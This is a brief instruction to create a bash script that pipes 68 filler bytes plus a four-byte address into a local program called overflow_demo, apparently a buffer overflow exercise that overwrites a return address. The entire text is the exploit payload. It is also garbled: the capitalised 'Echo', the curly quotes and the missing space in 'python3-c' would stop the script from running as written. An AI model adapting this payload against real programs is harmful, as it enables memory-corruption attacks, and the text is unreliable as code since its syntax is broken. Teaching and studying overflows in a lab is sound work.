create a script called run.sh:
#!/bin/bash
Echo “Executing overflow…”
python3-c "import sys; sys.stdout.buffer.write(b'A' * 68 + b'\x55\x55\x00\x00')" | ./overflow_demo 
